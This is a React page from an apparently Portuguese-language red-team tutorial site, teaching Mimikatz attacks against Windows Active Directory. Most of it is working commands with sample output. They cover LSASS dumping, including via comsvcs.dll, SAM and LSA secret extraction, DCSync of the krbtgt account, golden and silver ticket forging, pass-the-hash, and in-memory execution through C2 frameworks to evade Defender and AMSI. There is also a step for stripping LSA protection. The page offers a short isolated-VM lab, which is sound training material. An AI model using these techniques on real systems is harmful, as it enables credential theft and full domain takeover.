import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Mimikatz() {
  return (
    <PageContainer
      title="Mimikatz — o canivete suíço do Active Directory"
      subtitle="Dump LSASS, golden/silver tickets, DCSync, pass-the-hash, pass-the-ticket. Padrão de fato em Red Team Windows desde 2011."
      difficulty="avancado"
      timeToRead="22 min"
    >
      <h2>Por que Mimikatz ainda importa em 2025</h2>
      <p>
        <strong>Mimikatz</strong> (Benjamin Delpy / @gentilkiwi) abriu a era moderna de ataques contra
        Active Directory. Mesmo com Defender bloqueando o binário em 99% dos hosts, as <em>técnicas</em>{" "}
        (sekurlsa, kerberos, lsadump) continuam vivas — porteadas pra Cobalt Strike, Sliver, Impacket,
        Rubeus. Saber Mimikatz puro = entender o que essas ferramentas fazem por baixo.
      </p>

      <AlertBox type="danger" title="Defender vai matar imediatamente">
        <p>
          O <code>mimikatz.exe</code> oficial é assinado como malware desde 2014. Em pentest real você
          NUNCA dropa o EXE em disco. Carrega via Cobalt Strike <code>mimikatz</code>, Sliver{" "}
          <code>execute-assembly</code>, ou usa nettitch/SafetyKatz/Invoke-Mimikatz com bypass AMSI.
        </p>
      </AlertBox>

      <h2>Onde ele mora no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y mimikatz",
            out: "(pacote tem só os binários — você usa do Kali pra estudar / passar pro alvo via SMB upload em lab)",
            outType: "muted",
          },
          {
            cmd: "ls /usr/share/mimikatz/",
            out: `Win32  x64
mimikatz.exe   mimilib.dll   mimidrv.sys
mimikatz_trunk.zip`,
            outType: "info",
          },
          {
            cmd: "file /usr/share/mimikatz/x64/mimikatz.exe",
            out: "/usr/share/mimikatz/x64/mimikatz.exe: PE32+ executable (console) x86-64, for MS Windows",
            outType: "default",
          },
        ]}
      />

      <h2>Estrutura básica de comando</h2>
      <Terminal
        path="C:\\Tools"
        user="Administrator"
        host="WIN-DC01"
        lines={[
          {
            cmd: "mimikatz.exe",
            out: `  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )
 ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #`,
            outType: "info",
          },
          {
            comment: "sintaxe: módulo::comando [parâmetros]",
            cmd: "mimikatz # privilege::debug",
            out: "Privilege '20' OK",
            outType: "success",
          },
          {
            cmd: "mimikatz # token::whoami",
            out: `* Process Token : {0;000003e7} 1 D 27852       NT AUTHORITY\\SYSTEM    S-1-5-18    (04g,21p)   Primary
* Thread Token  : no token`,
            outType: "warning",
          },
        ]}
      />

      <h2>sekurlsa — credenciais em memória</h2>
      <CommandTable
        title="Módulo sekurlsa (lê do LSASS)"
        variations={[
          { cmd: "sekurlsa::logonpasswords", desc: "O comando icônico — dump tudo do LSASS.", output: "NTLM hash + Kerberos keys + tspkg + wdigest (se habilitado)." },
          { cmd: "sekurlsa::logonpasswords full", desc: "Inclui credentials providers extras.", output: "Output mais barulhento." },
          { cmd: "sekurlsa::tickets", desc: "Lista todos os Kerberos tickets em memória.", output: "TGT + TGS de cada user logado." },
          { cmd: "sekurlsa::tickets /export", desc: "Exporta tickets para .kirbi (pass-the-ticket).", output: "Cria arquivos [user]@[spn].kirbi no diretório atual." },
          { cmd: "sekurlsa::ekeys", desc: "Lista chaves AES128/AES256 (úteis p/ overpass-the-hash).", output: "Mais discreto que NTLM em modern AD." },
          { cmd: "sekurlsa::pth /user:Administrator /domain:acme /ntlm:HASH /run:cmd.exe", desc: "Pass-the-hash (cria processo com chain de logon falsa).", output: "Nova janela cmd.exe rodando como Administrator." },
          { cmd: "sekurlsa::minidump lsass.dmp", desc: "Trabalha em cima de dump offline (.dmp).", output: "Use depois de procdump.exe ou comsvcs.dll." },
        ]}
      />

      <h2>Caso real: dump LSASS local</h2>
      <Terminal
        path="C:\\Tools"
        user="Administrator"
        host="WIN-DC01"
        lines={[
          {
            cmd: "mimikatz # privilege::debug",
            out: "Privilege '20' OK",
            outType: "success",
          },
          {
            cmd: "mimikatz # sekurlsa::logonpasswords",
            out: `Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC01$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/3/2026 9:11:01 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : ACME
         * NTLM     : c1e07adc59f6c3eaa7a02e7a4e5f5cc1
         * SHA1     : 8c41f5fd05c4f67b4c18b88a58c87d12f6e4e891
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : ACME
         * Password : (null)
        kerberos :
         * Username : dc01$
         * Domain   : ACME.CORP
         * Password : 9d3e8b...

Authentication Id : 0 ; 1187234 (00000000:0012f1a2)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ACME
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ACME
         * NTLM     : 88846f7eaee8fb117ad06bdd830b7586
         * SHA1     : f2477a144dff4f216ab81f2ac50ec763a3c8b9aa`,
            outType: "warning",
          },
        ]}
      />

      <h2>Dump offline — comsvcs.dll trick</h2>
      <Terminal
        path="C:\\Windows\\System32"
        user="Administrator"
        host="WIN-DC01"
        lines={[
          {
            comment: "tasklist pra achar PID do lsass",
            cmd: "tasklist /fi \"imagename eq lsass.exe\"",
            out: `Image Name      PID Session Name        Session#    Mem Usage
============= ===== ================ ========== ============
lsass.exe       708 Services                  0     22,148 K`,
            outType: "info",
          },
          {
            comment: "dump usando comsvcs.dll (LOLBin built-in, sem dropar nada)",
            cmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 708 C:\\Temp\\l.dmp full',
            out: "(silencioso — gera ~50MB em C:\\Temp\\l.dmp)",
            outType: "muted",
          },
          {
            comment: "no Kali (ou em outro Windows offline), passa pro Mimikatz",
            cmd: "mimikatz # sekurlsa::minidump l.dmp",
            out: "Switch to MINIDUMP : 'l.dmp'",
            outType: "success",
          },
          {
            cmd: "mimikatz # sekurlsa::logonpasswords",
            out: "(mesmo output do comando online — extrai NTLM/Kerberos do dump)",
            outType: "warning",
          },
        ]}
      />

      <h2>lsadump — SAM, SECRETS, DCSync</h2>
      <CommandTable
        title="lsadump — credenciais persistidas"
        variations={[
          { cmd: "lsadump::sam", desc: "Dump local SAM (usuários locais + RID).", output: "RID  | User | NTLM" },
          { cmd: "lsadump::secrets", desc: "Dump LSA Secrets (service account passwords plain text).", output: "Util pra serviços com senhas legacy." },
          { cmd: "lsadump::cache", desc: "MS-Cache v2 (logons cached em laptops).", output: "Crackável offline com hashcat -m 2100." },
          { cmd: "lsadump::dcsync /user:krbtgt /domain:acme.corp", desc: "DCSync — replica DRSUAPI como se fosse outro DC.", output: "Pega NTLM + Kerberos de QUALQUER user, inclusive krbtgt." },
          { cmd: "lsadump::dcsync /domain:acme.corp /all", desc: "DCSync de TODO o domínio (cuidado: muito barulhento).", output: "Equivale a copiar ntds.dit completo." },
          { cmd: "lsadump::lsa /inject", desc: "Injeta no LSASS pra ler em runtime.", output: "Alternativa a sekurlsa." },
          { cmd: "lsadump::trust /patch", desc: "Lista trust relationships entre domínios.", output: "Útil p/ atravessar floresta." },
        ]}
      />

      <h3>DCSync — o ataque que faz Domain Admin sem botar pé no DC</h3>
      <Terminal
        path="C:\\Tools"
        user="Administrator"
        host="WS-USR07"
        lines={[
          {
            comment: "user com permissão DS-Replication-Get-Changes (não precisa ser DA)",
            cmd: "mimikatz # lsadump::dcsync /user:krbtgt /domain:acme.corp",
            out: `[DC] 'acme.corp' will be the domain
[DC] 'DC01.acme.corp' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Password last change : 1/14/2024 10:22:14 AM
Object Security ID   : S-1-5-21-1827831049-...-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f
    ntlm- 0: e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f
    lm  - 0: 8c4f5fd05c4f67b4c18b88a58c87d12f

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    aes256_hmac       (4096) : 5c9dafe...
    aes128_hmac       (4096) : 8e1234a...`,
            outType: "warning",
          },
        ]}
      />

      <h2>kerberos — golden e silver tickets</h2>
      <CodeBlock
        language="bash"
        title="Golden Ticket (forja TGT como qualquer user, inclusive Administrator)"
        code={`# pré-requisito: NTLM hash do krbtgt (do DCSync acima) + SID do domínio
mimikatz # kerberos::golden \\
    /user:Administrator \\
    /domain:acme.corp \\
    /sid:S-1-5-21-1827831049-3422871099-2841120131 \\
    /krbtgt:e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f \\
    /id:500 \\
    /groups:512,513,518,519,520 \\
    /ptt

# /ptt = pass-the-ticket: injeta no current logon session
# /id:500 = RID do Administrator embutido
# /groups: 512=DA, 513=Domain Users, 518=Schema Admins, 519=Enterprise Admins

# resultado: o user atual agora consegue acessar QUALQUER coisa do domínio
# como Administrator — válido por 10 anos por default
mimikatz # exit
C:\\> dir \\\\dc01.acme.corp\\c$
 (acesso liberado!)`}
      />

      <CodeBlock
        language="bash"
        title="Silver Ticket (forja TGS pra UM serviço específico)"
        code={`# pré-requisito: NTLM hash da computer account do servidor alvo
# (ex: hash do MSSQL01$, peguei via DCSync ou mimikatz local)

mimikatz # kerberos::golden \\
    /user:Administrator \\
    /domain:acme.corp \\
    /sid:S-1-5-21-1827831049-3422871099-2841120131 \\
    /target:mssql01.acme.corp \\
    /service:MSSQLSvc \\
    /rc4:8c41f5fd05c4f67b4c18b88a58c87d12f \\
    /ptt

# /service: lista de SPNs comuns:
#   CIFS  -> SMB shares
#   HTTP  -> WinRM, IIS, SCCM
#   LDAP  -> AD operations (NÃO permite DCSync — só TGT permite)
#   MSSQLSvc -> SQL Server
#   HOST  -> qualquer serviço local de máquina

# vantagem do silver: NÃO toca no DC (não loga 4769),
# bem mais discreto que golden`}
      />

      <h2>kerberos::list e kerberos::ptt</h2>
      <Terminal
        path="C:\\Tools"
        user="Administrator"
        host="WS-USR07"
        lines={[
          {
            cmd: "mimikatz # kerberos::list",
            out: `[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/3/2026 9:11:01 AM ; 4/3/2026 7:11:01 PM ; 4/10/2026 9:11:01 AM
   Server Name       : krbtgt/ACME.CORP @ ACME.CORP
   Client Name       : jsmith @ ACME.CORP
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;`,
            outType: "info",
          },
          {
            comment: "importar .kirbi exportado anteriormente",
            cmd: "mimikatz # kerberos::ptt Administrator@krbtgt-ACME.CORP.kirbi",
            out: `* File: 'Administrator@krbtgt-ACME.CORP.kirbi': OK`,
            outType: "success",
          },
          {
            comment: "agora tem TGT do Administrator no current session",
            cmd: "C:\\> klist",
            out: `Cached Tickets: (1)
#0> Client: Administrator @ ACME.CORP
    Server: krbtgt/ACME.CORP @ ACME.CORP
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96`,
            outType: "warning",
          },
        ]}
      />

      <h2>Pass-the-Hash com sekurlsa::pth</h2>
      <Terminal
        path="C:\\Tools"
        user="jsmith"
        host="WS-USR07"
        lines={[
          {
            comment: "tem NTLM mas não a senha — ainda dá pra logar como Administrator",
            cmd: "mimikatz # sekurlsa::pth /user:Administrator /domain:acme.corp /ntlm:88846f7eaee8fb117ad06bdd830b7586 /run:cmd.exe",
            out: `user    : Administrator
domain  : acme.corp
program : cmd.exe
impers. : no
NTLM    : 88846f7eaee8fb117ad06bdd830b7586
  |  PID  4188
  |  TID  4192
  |  LSA Process is now R/W
  |  LUID 0 ; 24851291 (00000000:0017b1db)
   \\_ msv1_0   - data copy @ 0000019F8E2D1E70 : OK !
   \\_ kerberos - data copy @ 0000019F8E2A4B30
    \\_ aes256_hmac       -> null
    \\_ aes128_hmac       -> null
    \\_ rc4_hmac_nt       OK
    \\_ rc4_hmac_old      OK`,
            outType: "warning",
          },
          {
            comment: "abre nova janela cmd.exe — TGT vai ser pedido on-the-fly como Administrator",
            cmd: "C:\\> dir \\\\dc01.acme.corp\\c$",
            out: " Volume in drive \\\\dc01.acme.corp\\c$ has no label.\n Directory of \\\\dc01.acme.corp\\c$\n\n01/14/2025  10:22 AM    <DIR>          Windows\n01/14/2025  10:22 AM    <DIR>          Users",
            outType: "success",
          },
        ]}
      />

      <h2>Como rodar Mimikatz SEM dropar EXE em 2026</h2>
      <CommandTable
        title="Caminhos modernos (todos in-memory)"
        variations={[
          { cmd: "Cobalt Strike: mimikatz <cmd>", desc: "BOF embutida, executa em memória do beacon.", output: "beacon> mimikatz sekurlsa::logonpasswords" },
          { cmd: "Sliver: armory install pypykatz + execute", desc: "pypykatz lê dump LSASS via Python, sem AV trigger.", output: "Roda no Kali processando .dmp baixado." },
          { cmd: "Havoc: dotnet-inline SafetyKatz.exe", desc: "Versão .NET ofuscada do Mimikatz.", output: "execute_assembly via Demon." },
          { cmd: "Impacket: secretsdump.py", desc: "Python puro, equivalente a lsadump::dcsync.", output: "secretsdump.py acme/Admin@dc01 -just-dc" },
          { cmd: "PowerShell: Invoke-Mimikatz", desc: "PowerSploit script — precisa AMSI bypass.", output: "Bem detectado em 2026." },
          { cmd: "nanodump.exe + sekurlsa::minidump", desc: "Dumper específico de LSASS via técnicas modernas.", output: "Output em formato .dmp pra processar offline." },
          { cmd: "ProcDump (Sysinternals): -ma lsass.exe l.dmp", desc: "Binário assinado pela Microsoft (LOLBin classe SAS).", output: "Usado dentro de scripts internos sem alarmar." },
        ]}
      />

      <h2>Equivalentes no Kali (Linux-side)</h2>
      <CodeBlock
        language="bash"
        title="processar dump LSASS de Linux"
        code={`# pypykatz: implementação Python pura do Mimikatz
pip install pypykatz
pypykatz lsa minidump /loot/lsass.dmp

# saída inclui mesmas info: NTLM, AES keys, kerberos tickets

# secretsdump (Impacket): DCSync direto do Kali
impacket-secretsdump acme.corp/jsmith:'Pass!2026'@dc01.acme.corp -just-dc-user krbtgt

# resultado:
# [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f:::

# crackmapexec/nxc tem comando ntlmrelayx integrado
nxc smb dc01.acme.corp -u jsmith -p 'Pass!2026' --ntds`}
      />

      <PracticeBox
        title="Lab seguro: dump SAM local em VM Windows isolada"
        goal="Dump local SAM (não LSASS) usando mimikatz em VM Windows snapshot — sem tocar AD real."
        steps={[
          "Numa VM Windows 10 sem rede, copie mimikatz.exe x64 (Defender desligado).",
          "Abra cmd.exe COMO ADMINISTRADOR.",
          "Inicie mimikatz.exe.",
          "Eleva: privilege::debug.",
          "Dump SAM local: token::elevate; lsadump::sam.",
          "Salve a saída e crackeie no Kali com hashcat -m 1000.",
        ]}
        command={`mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # exit

# no Kali:
echo 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' > sam.txt
hashcat -m 1000 sam.txt /usr/share/wordlists/rockyou.txt -O`}
        expected={`Domain : DESKTOP-LAB
SysKey : 8c41f5fd05c4f67b4c18b88a58c87d12f
Local SID : S-1-5-21-3623811015-3361044348-30300820

SAMKey : 17f1c7d2a83e54b9...

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0  (= senha vazia)`}
        verify="A saída mostra hash NTLM do user Administrator local da VM. Se Defender bloqueou, instale fork SafetyKatz ou desligue Defender só na VM-lab."
      />

      <AlertBox type="warning" title="LSA Protection (RunAsPPL) bloqueia sekurlsa">
        <p>
          Em Windows 11 / Server 2022+, LSASS roda como Protected Process Light. Mimikatz padrão não
          consegue ler. Soluções: (1) <code>!+</code> + <code>!processprotect /process:lsass.exe /remove</code>{" "}
          via mimidrv.sys (driver assinado, mas detectado), (2) dump via comsvcs.dll antes de
          processar offline, (3) Credential Guard ativo = só Kerberos AES disponível, sem NTLM.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
